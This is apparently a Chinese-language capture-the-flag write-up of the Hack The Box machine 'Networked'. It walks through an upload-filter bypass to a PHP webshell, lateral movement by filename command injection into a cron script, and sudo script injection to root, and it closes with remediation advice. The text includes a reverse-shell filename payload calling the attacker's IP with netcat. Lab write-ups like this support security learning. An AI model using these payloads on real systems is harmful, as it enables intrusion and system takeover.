## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Networked
2. 難度:Easy
3. IP:10.129.42.180

### 主要發現：
1. 漏洞 ：繞過檔案上傳過濾可導致程式碼執行（風險等級：Critical）
2. 漏洞 ：利用檔案名過濾不當的crontab腳本以普通使用者身分執行命令達成橫向移動（風險等級：High）
3. 漏洞 ：利用未設置密碼的sudo權限執行網路配置腳本達成權限提升（風險等級：Critical）

### 攻擊鏈摘要：

經過目錄爆破暴露的目錄中可得到網站的原始程式碼，可了解到上傳檔案的過濾規則，繞過後可上傳PHP腳本，達成遠端程式碼執行，獲取初步系統存取權。系統存在crontab腳本未正確過濾檔案名，低權限帳號可透過檔案名實現命令注入，獲得高權限使用者存取權。利用未設密碼的sudo權限實現命令注入網路配置腳本達成權限提升，獲得root權限。


### 潛在影響：

1. 攻擊者可透過上傳WebShell腳本直接在伺服器上執行任意系統指令，使攻擊者獲得系統存取權，造成機密資料外洩。
2. 檔案名過濾不當的crontab腳本使攻擊者可橫向移動至高權使用者，造成重要資料外洩。
3. 利用未設密碼的sudo權限實現命令注入網路配置腳本達成權限提升，造成系統全面崩潰。

### 修復建議：

1. 針對上傳檔案應包含副檔名進行過濾，實施白名單制，並設置不可執行腳本。
2. 禁止排程腳本存取或操作普通使用者可寫入的目錄，並過濾檔名。
3. 應要求sudo驗證密碼，並明確指定可執行的完整指令與參數。
4. 網路配置腳本英對使用者輸入進行過濾，不可使其被解讀成可執行命令。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.42.180
sudo nmap -sT -Pn -sV -sC -O -p22,80,3000 10.129.42.180
sudo nmap --script=vuln -p22,80,3000 10.129.42.180
```
<img width="873" height="254" alt="螢幕擷取畫面 2026-03-02 164527" src="https://github.com/user-attachments/assets/a6b46696-2dbb-463a-8b1e-12bb128018d4" />
<img width="1865" height="454" alt="螢幕擷取畫面 2026-03-02 164539" src="https://github.com/user-attachments/assets/ef399640-b031-40d7-92aa-8d960589aff3" />
<img width="720" height="547" alt="螢幕擷取畫面 2026-03-02 164556" src="https://github.com/user-attachments/assets/e9409ca6-4e3a-4ca8-9b41-073c34c397d1" />

探索80主頁

<img width="664" height="298" alt="螢幕擷取畫面 2026-03-02 164615" src="https://github.com/user-attachments/assets/1e30fbc9-0ba4-4631-b366-2baaebcdb73f" />


### 2.2 枚舉(Enumeration)

使用gobuster爆破目錄
```bash
sudo gobuster dir -u http://10.129.42.180 -w /usr/share/wordlists/dirb/cpmmpn.txt -x php,txt
```

<img width="881" height="731" alt="螢幕擷取畫面 2026-03-02 165117" src="https://github.com/user-attachments/assets/38838d23-fb3a-478a-8a10-ffcf424ea833" />

探索可疑目錄

<img width="1284" height="544" alt="螢幕擷取畫面 2026-03-02 165137" src="https://github.com/user-attachments/assets/b5750b56-aa74-4122-b659-98e6f04cef7f" />
<img width="1229" height="430" alt="螢幕擷取畫面 2026-03-02 165145" src="https://github.com/user-attachments/assets/facdfb57-5908-4f49-989c-549f4cfb69c7" />
<img width="1522" height="499" alt="螢幕擷取畫面 2026-03-02 165152" src="https://github.com/user-attachments/assets/8f9fa443-e606-41bb-a3de-9a1440bedfac" />


### 2.3 初始存取(Initial Access)

下載/backup目錄中的.tar檔並解壓

<img width="522" height="284" alt="螢幕擷取畫面 2026-03-02 165257" src="https://github.com/user-attachments/assets/cd2dfa22-15ed-4490-aaed-ca56f762da55" />

在upload.php和lib.php中了解檔案上傳規則與過濾規則，過濾了檔案大小、副檔名和檔案類型，但並未拒絕腳本以.php.jpg(或.png等)為副檔名

<img width="726" height="121" alt="螢幕擷取畫面 2026-03-02 165608" src="https://github.com/user-attachments/assets/71c55fac-602b-4ed1-8b58-d3cf204fb9f2" />
<img width="694" height="183" alt="螢幕擷取畫面 2026-03-02 165632" src="https://github.com/user-attachments/assets/640feae1-5b59-4e9f-baaa-bce545705e6b" />
<img width="395" height="150" alt="螢幕擷取畫面 2026-03-02 165805" src="https://github.com/user-attachments/assets/a2868f50-249f-49ce-9ea0-2ab239499896" />

創造一個以.gif魔法數字為開頭的PHP腳本

<img width="559" height="193" alt="螢幕擷取畫面 2026-03-02 171535" src="https://github.com/user-attachments/assets/c60ed368-c094-47ee-9ec5-4444aecf99b2" />

上傳檔案成功

<img width="885" height="343" alt="螢幕擷取畫面 2026-03-02 171552" src="https://github.com/user-attachments/assets/3b74fa26-d9f5-4799-8875-2edf0da5e316" />
<img width="820" height="313" alt="螢幕擷取畫面 2026-03-02 171600" src="https://github.com/user-attachments/assets/6d813d3d-ea3a-4c04-9deb-5b8d30498d3c" />

圖片檔無法顯示，我嘗試更改URL後成功顯示


PS.我在這裡卡關很久，因為無論點開哪張圖片都會跳轉回/photo.php，我看了別人的write-up並未出現這種狀況

<img width="1197" height="590" alt="螢幕擷取畫面 2026-03-02 171610" src="https://github.com/user-attachments/assets/2610f494-16c1-4cf3-a682-acd58e33344d" />
<img width="1192" height="576" alt="螢幕擷取畫面 2026-03-02 171729" src="https://github.com/user-attachments/assets/02074869-f9b2-440f-9f05-76763ba87fbc" />

為避免圖片再次故障，我以新分頁開啟圖片

<img width="1245" height="672" alt="螢幕擷取畫面 2026-03-02 171730" src="https://github.com/user-attachments/assets/836bde3b-62d9-40ed-8c1e-1033fe3c2a2e" />

修改URL，並注入命令

<img width="1402" height="293" alt="螢幕擷取畫面 2026-03-02 171936" src="https://github.com/user-attachments/assets/af2361d8-f99f-4ad1-ba2d-4bc593eded0f" />

開啟nc監聽
```bash
nc-lvnp 1234
```
<img width="378" height="92" alt="螢幕擷取畫面 2026-03-02 171958" src="https://github.com/user-attachments/assets/fcd44816-9335-4544-8fd8-5e7df1564ef8" />

將命令URL編碼化

<img width="843" height="676" alt="螢幕擷取畫面 2026-03-02 172208" src="https://github.com/user-attachments/assets/1aa3c84d-7ae7-424b-a271-344a9d437aa5" />

注入後獲得反彈Shell

<img width="1429" height="215" alt="螢幕擷取畫面 2026-03-02 172225" src="https://github.com/user-attachments/assets/0c722f72-e906-467a-a104-917532aa69ab" />
<img width="615" height="197" alt="螢幕擷取畫面 2026-03-02 172235" src="https://github.com/user-attachments/assets/6fba6ed3-1786-479f-a765-73c37de9965f" />


### 2.4 橫向移動(Lateral Movement)

無法獲得user.txt

<img width="341" height="62" alt="螢幕擷取畫面 2026-03-02 172842" src="https://github.com/user-attachments/assets/c7ddffa5-deac-4122-854d-0173e7d611ec" />

檢查HOME目錄中的crontab.guly腳本

<img width="622" height="286" alt="螢幕擷取畫面 2026-03-02 172852" src="https://github.com/user-attachments/assets/6c05c81a-58ef-495c-84a0-aaaf3b4c727e" />
<img width="574" height="701" alt="螢幕擷取畫面 2026-03-02 173157" src="https://github.com/user-attachments/assets/c799979e-ee29-4439-9230-fee1c4575a1c" />

腳本並未過濾正確檔名，可嘗試利用檔名進行命令注入

<img width="574" height="701" alt="螢幕擷取畫面 2026-03-02 173158" src="https://github.com/user-attachments/assets/f8254e24-642e-4a18-8911-5ffc00668ac5" />

回到指定目錄創建命令注入檔名，使用;分隔掉程式邏輯
```bash
touch ';nc -c bash 10.10.14.229 4444'
```
<img width="714" height="154" alt="螢幕擷取畫面 2026-03-02 173706" src="https://github.com/user-attachments/assets/0df53d8d-3b1b-4a28-928b-b5eb80522e5d" />

建立nc監聽，並等待3分鐘
```bash
nc -lvnp 4444
```
<img width="329" height="99" alt="螢幕擷取畫面 2026-03-02 173721" src="https://github.com/user-attachments/assets/fc9d6aeb-a9e9-4da0-b886-ded88ab29257" />

成功獲得使用者權限和user.txt

<img width="604" height="181" alt="螢幕擷取畫面 2026-03-02 174035" src="https://github.com/user-attachments/assets/9ef2c2fa-3217-465d-b543-3b78375bc49b" />
<img width="443" height="204" alt="螢幕擷取畫面 2026-03-02 174211" src="https://github.com/user-attachments/assets/02246a3e-7129-4b5c-893d-0a79ee23d9e8" />


### 2.5 權限提升(Privilege Escalation)

查詢sudo權限
```bash
sudo -l
```
<img width="743" height="252" alt="螢幕擷取畫面 2026-03-02 174341" src="https://github.com/user-attachments/assets/7f1c2780-8928-4f91-bd6a-542ff9d6d429" />

了解.sh腳本，為網路配置腳本，未正確過濾可嘗試命令注入

<img width="596" height="438" alt="螢幕擷取畫面 2026-03-02 174456" src="https://github.com/user-attachments/assets/fdae6f53-d1fa-4a7d-b604-9e708cac0444" />

以sudo權限執行腳本後嘗試命令注入成功

<img width="1103" height="436" alt="螢幕擷取畫面 2026-03-02 175738" src="https://github.com/user-attachments/assets/132babb0-295e-4ea3-92f4-983c9aff5645" />

注入命令，獲得root權限
```bash
/bin/bash
```
<img width="535" height="351" alt="螢幕擷取畫面 2026-03-02 175840" src="https://github.com/user-attachments/assets/7d5cf0f0-1e0d-44a3-bc56-9d84bd856812" />



### 2.6 最終成果(Impact)

獲得root權限及root.txt


<img width="1056" height="274" alt="螢幕擷取畫面 2026-03-02 175953" src="https://github.com/user-attachments/assets/a23a32e5-036b-4196-9b44-86744517ff74" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 練習閱讀PHP以及sh腳本，本次並未遇見特別難懂的腳本。
2. 利用魔法數字創建gif檔案比想像中簡單。
3. 關鍵提權點都放在眼前，重要的是程式碼閱讀能力。



### 浪費時間的部分：

1. 關於/photo.php上圖片無法顯示問題，我浪費了非常多時間反覆閱讀程式碼，並且重開靶機，均未起作用，別人的write up也並未出現這種狀況，直到我在URL呼叫了upload。

### 新知識點：

1. 魔法數字的使用方法。
2. 以滲透測試角度閱讀程式碼無須從上而下每一行看完，只要看關鍵的輸入和輸出即可，中間都是過濾，等需要時再看(至少我是這樣的)。

### 與實戰對應：

1. 本靶機考驗白盒測試能力，實戰中常見，需要熟練。
2. 提權點都在眼前，在使用自動化腳本之前應盡量手動枚舉，甚至應該將自動化腳本當成最後的退路(至少我是這樣的)。

